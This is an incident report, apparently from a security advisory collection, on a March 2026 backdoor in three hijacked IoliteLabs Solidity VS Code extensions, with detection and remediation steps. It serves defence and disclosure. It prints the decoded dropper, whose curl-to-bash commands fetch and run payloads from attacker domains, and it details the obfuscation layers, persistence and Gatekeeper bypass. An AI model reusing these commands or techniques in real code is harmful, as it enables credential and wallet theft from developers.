# IoliteLabs Solidity VSCode Extensions — Dormant Publisher Backdoor

**Date:** March 2026
**Ecosystem:** VS Code Marketplace
**Severity:** Critical
**Type:** Backdoor / Infostealer / Dormant publisher account hijack
**Sources:**
- [StepSecurity — Malicious IoliteLabs VSCode Extensions Target Solidity Developers on Windows, macOS, and Linux with Backdoor](https://www.stepsecurity.io/blog/malicious-iolitelabs-vscode-extensions-target-solidity-developers-on-windows-macos-and-linux-with-backdoor)

---

## Summary

On March 25, 2026, all three VSCode extensions published by the IoliteLabs account — `iolitelabs.solidity-macos`, `iolitelabs.solidity-windows`, and `iolitelabs.solidity-linux` — were simultaneously updated to version 0.1.8. The extensions had been dormant since 2018, accumulating approximately 27,500 combined installs over eight years. An attacker compromised the original publisher account and republished all three with an identical multi-stage backdoor, inheriting the trust capital of a long-established publisher without triggering new-extension scrutiny.

The malicious code is not in the extension's declared entry point (`extension.js`) but injected into a bundled copy of the legitimate `pako` compression library (`node_modules/pako/index.js`). Using five obfuscation layers, the dropper silently downloads platform-specific payloads on every VSCode startup via the `onStartupFinished` activation event. On Windows, it installs a hook-based DLL disguised as a Chrome updater; on macOS, it deploys two architecture-specific native binaries (Intel and Apple Silicon) with LaunchAgent login persistence and automated Gatekeeper bypass. Linux is referenced in the extension names but receives no payload in v0.1.8.

The attack specifically targets Solidity and Ethereum developers — a population with routine access to wallet private keys, deployment accounts, seed phrases, and DeFi API credentials. StepSecurity's analysis confirmed two C2 domains in the initial dropper and a third entirely separate domain for the Windows MSI stage — providing operational resilience against individual domain takedowns.

---

## Compromised Artifacts

| Extension ID | Version | Installs | VSIX SHA-256 |
|---|---|---|---|
| `iolitelabs.solidity-macos` | 0.1.8 | 6,995 | `e0f206aac2c3fa733b0c466d2ebb86ba038cf1fe2edeee21e94a4d943a27f63b` |
| `iolitelabs.solidity-windows` | 0.1.8 | 11,511 | (not yet analyzed at time of publication) |
| `iolitelabs.solidity-linux` | 0.1.8 | 8,078 | (not yet analyzed at time of publication) |

Malicious version: **0.1.8** (all three extensions, published 2026-03-25)
Last legitimate version: **0.1.2** (published September 2018)

| File | SHA-256 |
|---|---|
| Tampered `pako/index.js` | `fcd398abc51fd16e8bc93ef8d88a23d7dec28081b6dfce4b933020322a610508` |
| Legitimate `pako@1.0.11` index.js | `e7ec4e35d94d01a2e4ee5dca62b8fb08ac7411596edb54b398651f4eb563561d` |

---

## How It Worked

### Entry Point — Dependency Injection

The extension's declared entry point (`extension/out/extension.js`, 4 KB) contains only five stub command registrations that display informational popups — no real Solidity LSP functionality remains. The dropper is instead injected as a single dense line at line 10 of the bundled `node_modules/pako/index.js`. Since most extension security reviews focus only on the declared entry point, this placement evades the vast majority of manual inspections.

The `onStartupFinished` activation event ensures the dropper fires on every VSCode launch regardless of what language or project is open — not just when a `.sol` file is opened.

### Payload Mechanics — Five Obfuscation Layers

The single injected line uses five distinct techniques to defeat static analysis:

1. **Unicode escape sequences** — all sensitive strings encoded as `\uXXXX` hex codes (e.g. `child_process` → `"\u0063\u0068\u0069\u006C\u0064\u005F\u0070\u0072\u006F\u0063\u0065\u0073\u0073"`). Defeats `grep`-based and YARA scanning.
2. **Bracket property access** — methods called as `cp['exec']` and `process['platform']` instead of dot notation. Defeats property-access scanners.
3. **XOR junk variables** — meaningless arithmetic like `(965581^965578)+(724804^724800)` scattered throughout. Defeats code-flow analysis.
4. **String reversal for platform check** — `"darwin"` written as `"niwrad".split("").reverse().join("")`. Defeats literal string matching on `"darwin"`.
5. **Dependency hiding** — payload buried in a transitive dependency file, not the extension entry point.

Decoded logic:
```javascript
const cp = require("child_process");
if (process.platform === "win32") {
  cp.exec(
    'curl -k -L -Ss "https://rraghh.com/gt/calc.bat" -o "%TEMP%\\1.bat" && start /b "" "%TEMP%\\1.bat"',
    { detached: true, stdio: 'ignore' }
  ).unref();
} else if (process.platform === "darwin") {
  cp.exec(
    'curl -fsSL https://cdn.rraghh.com/gt/doc.sh | bash',
    { detached: true, stdio: "ignore" }
  ).unref();
}
```

### Windows Stage 1 — calc.bat (String-Split Obfuscation)

The batch file uses environment variable concatenation to reconstruct all URLs at runtime — no complete URL appears as a literal. The reconstructed flow:
1. Downloads `7WhiteSmoke.msi` from a **second C2 domain** (`oortt.com`) that is entirely absent from the pako dropper
2. Executes: `msiexec /i %USERPROFILE%\Documents\7WhiteSmoke.msi /qn` (silent install)

### Windows Stage 2 — 7WhiteSmoke.msi (Chrome Impersonation)

The MSI (3 MB, created 2026-03-22) presents as a Chrome browser updater: MSI Subject `ChromeUpdate`, Author `Chrome`. It installs a single DLL (`ntuser`) to `%APPDATA%\Chrome\ChromeUpdate\ntuser`, then executes it via `regsvr32 /s /i` — a LOLbin technique that runs the DLL without spawning `cmd.exe` or `powershell.exe`, evading EDR rules monitoring those processes. The DLL exports `SetDesktopMonitorHook` and `ClearDesktopMonitorHook`, consistent with a Windows desktop-level hook capable of intercepting keyboard, mouse, or clipboard input across all processes in the desktop session.

### macOS Stage 1 — doc.sh (Three-Phase Persistence)

**Phase 1 — Hidden launcher**: Writes `~/.local/bin/.system_updater` (dot-prefixed, hidden from `ls`). This script re-downloads and re-executes the stage-2 binary on every invocation, enabling attacker-pushed updates to already-compromised machines.

**Phase 2 — LaunchAgent persistence**: Installs `~/Library/LaunchAgents/com.apple.system.updater.plist` with `RunAtLoad: true`. The label `com.apple.system.updater` deliberately mimics Apple's reverse-DNS naming convention for system services. Immediately loaded with `launchctl load` — no reboot required.

**Phase 3 — Gatekeeper bypass and immediate execution**: Strips `com.apple.quarantine` extended attribute (`xattr -d com.apple.quarantine`) before executing, bypassing the macOS dialog that would otherwise block unsigned downloads. `xattr -c` is used as a fallback. Both commands suppress errors with `2>/dev/null || true`.

### macOS Stage 2 — Architecture-Aware Binaries

Two separate payloads are maintained:
- `doc` (x86_64 Intel, 57.8 MB) — downloaded to `~/.local/bin/updater`
- `doc1` (arm64 Apple Silicon, 7.9 MB) — downloaded to `~/.local/bin/apple`

Both are `pkg`-packaged Node.js executables (Vercel `pkg` tool) containing embedded modules consistent with a filesystem-sweeping exfiltration tool: `archiver` (ZIP/TAR creation), `form-data` (multipart HTTP upload), `combined-stream`, and `graceful-fs`. The targeting is clear — sweep for wallet keystores, private keys, seed phrases, and API credentials, then exfiltrate via multipart HTTP POST.

### C2 Infrastructure

| Domain | Role | Payloads Served |
|---|---|---|
| `rraghh.com` | Stage-1 Windows dropper | `calc.bat` |
| `cdn.rraghh.com` | Stage-1 macOS dropper + stage-2 Mac binaries | `doc.sh`, `doc` (Intel), `doc1` (arm64) |
| `oortt.com` | Stage-2 Windows MSI delivery | `7WhiteSmoke.msi` |

The three-domain architecture provides operational resilience — takedown of `rraghh.com` does not affect the Windows MSI delivery channel, and vice versa.

---

## Timeline

| Date/Time (UTC) | Event |
|---|---|
| 2018-09 | Original IoliteLabs extensions published (v0.1.2); no updates for ~8 years |
| 2026-03-22 | `7WhiteSmoke.msi` installer created (embedded MSI metadata date) |
| 2026-03-25 | All three extensions simultaneously updated to v0.1.8 on VS Code Marketplace; no corresponding commits in the public GitHub repo |
| 2026-03-27/28 | StepSecurity publishes technical analysis including previously undocumented second C2 domain (`oortt.com`) and full IOC set |

---

## Detection

```bash
# 1. Check if any IoliteLabs extension is installed
code --list-extensions | grep -i iolitelabs

# 2. Verify pako hash if extension is/was installed
find ~/.vscode/extensions -path "*/iolitelabs*" -name "index.js" -path "*/pako/*" \
  -exec sha256sum {} \;
# Malicious:   fcd398abc51fd16e8bc93ef8d88a23d7dec28081b6dfce4b933020322a610508
# Legitimate:  e7ec4e35d94d01a2e4ee5dca62b8fb08ac7411596edb54b398651f4eb563561d

# 3. macOS — check for persistence artifacts
ls -la ~/Library/LaunchAgents/ | grep -i "system.updater"
ls -la ~/.local/bin/ 2>/dev/null | grep -E "\.system_updater|updater|apple"
cat /tmp/system_updater.log 2>/dev/null  # exists only if LaunchAgent ran

# 4. macOS — check for PATH modification
grep "local/bin" ~/.zshrc ~/.bash_profile 2>/dev/null

# 5. Windows — check for ChromeUpdate DLL
Test-Path "$env:APPDATA\Chrome\ChromeUpdate\ntuser"
Get-ItemProperty "HKLM:\Software\Chrome\ChromeUpdate" 2>$null

# 6. Check network/DNS logs for C2 domains
grep -Ei "rraghh\.com|oortt\.com" /var/log/syslog /etc/hosts 2>/dev/null
# Windows: check Windows Defender firewall logs or DNS resolver cache
ipconfig /displaydns | findstr "rraghh\|oortt"
```

---

## Remediation

1. **Uninstall the extension** from VS Code:
   ```bash
   code --uninstall-extension iolitelabs.solidity-macos
   code --uninstall-extension iolitelabs.solidity-windows
   code --uninstall-extension iolitelabs.solidity-linux
   ```

2. **macOS — remove all persistence artifacts**:
   ```bash
   launchctl unload ~/Library/LaunchAgents/com.apple.system.updater.plist 2>/dev/null
   rm -f ~/Library/LaunchAgents/com.apple.system.updater.plist
   rm -f ~/.local/bin/.system_updater ~/.local/bin/updater ~/.local/bin/apple
   # Manually remove the PATH line from ~/.zshrc and ~/.bash_profile:
   grep -n "local/bin" ~/.zshrc ~/.bash_profile
   ```

3. **Windows — remove ChromeUpdate artifacts**:
   ```powershell
   Remove-Item -Recurse -Force "$env:APPDATA\Chrome\ChromeUpdate" -ErrorAction SilentlyContinue
   Remove-Item -Path "HKLM:\Software\Chrome\ChromeUpdate" -Recurse -ErrorAction SilentlyContinue
   Remove-Item -Force "$env:TEMP\1.bat" -ErrorAction SilentlyContinue
   Remove-Item -Force "$env:USERPROFILE\Documents\7WhiteSmoke.msi" -ErrorAction SilentlyContinue
   ```

4. **Rotate all credentials** — if the extension ran at any point since March 25, 2026, treat the machine as fully compromised and rotate: Ethereum/Solidity private keys and seed phrases, SSH keys, `.env` API keys, AWS/GCP/Azure credentials, GitHub and npm tokens, browser-stored passwords and session cookies.

5. **Block C2 domains at DNS/firewall**: `rraghh.com`, `cdn.rraghh.com`, `oortt.com`.

6. **Audit network logs** for any outbound connections to the three C2 domains — any hit confirms execution occurred.

---

## Lessons Learned

- **Extension age is not a trust signal.** Eight years of publication history and 27,500 installs were entirely inherited by the attacker through a single account compromise. Dormant publisher accounts present a systemic risk in every marketplace.
- **Review dependencies, not just entry points.** The malicious code was in `node_modules/pako/index.js`, not `extension.js`. Extension reviews that check only the declared entry point miss bundled dependency tampering entirely.
- **`onStartupFinished` in a language extension is a red flag.** This activation event serves no legitimate purpose in a Solidity extension — it exists solely to execute code on every VSCode launch regardless of context.
- **Gatekeeper bypass is automated.** The `xattr -d com.apple.quarantine` technique is a documented bypass that requires no user interaction. Gatekeeper is not a sufficient control against post-download payload execution.
- **Three-domain C2 architecture increases takedown resilience.** Defenders must block all three domains, not just the one in the initial dropper, to interrupt the full kill chain.
- **Marketplace operators should require re-authentication for major version bumps after long dormancy periods** and alert existing subscribers when a publisher suddenly becomes active after years of inactivity.

---

## Related Incidents

- [./2026-03-fast-draft-bloktrooper.md](./2026-03-fast-draft-bloktrooper.md) — OpenVSX extension compromise with similar RAT payload targeting developers
- [./2026-03-glassworm-chrome-rat.md](./2026-03-glassworm-chrome-rat.md) — Multi-stage RAT using npm/PyPI to force-install Chrome extension
- [./2025-08-nx-build-system.md](./2025-08-nx-build-system.md) — IDE auto-update vector used in NX build system compromise
